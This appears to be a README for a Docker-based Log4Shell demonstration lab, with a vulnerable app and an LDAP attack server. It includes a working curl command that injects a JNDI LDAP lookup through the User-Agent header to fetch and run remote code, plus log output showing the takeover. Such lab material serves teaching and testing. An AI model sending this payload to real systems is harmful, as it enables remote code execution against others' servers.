
```
docker compose down
docker compose build
docker compose up
```

```
curl -v -H "User-Agent: \${jndi:ldap://attack-server:10389/cn=badcode,dc=predic8,dc=de}" http://localhost:9090
```

You have to see in the log:
```
vulnerable-app  |
vulnerable-app  | [!] YOU'VE BEEN H4CKED! [!]
vulnerable-app  | [*] Current directory: /app
vulnerable-app  | [*] Your system belongs to us now >:)
vulnerable-app  | [-] Have a nice day! muhahahaha!
vulnerable-app  |
```

##  OR
Build attack container:
```bash
cd attack-server
docker buildx build --platform linux/amd64 -t jndi-ldap-attack --load .
```
Build vulnerable container:
```bash
cd demo-vuln-app
docker buildx build --platform linux/amd64 -t demo-vuln-app --load .
```

Run attack container:
```bash
docker run -p 8080:8080 -p 10389:10389 jndi-ldap-attack
```

Run vulnerable container:
```bash
docker run -p 9090:9090 demo-vuln-app
```
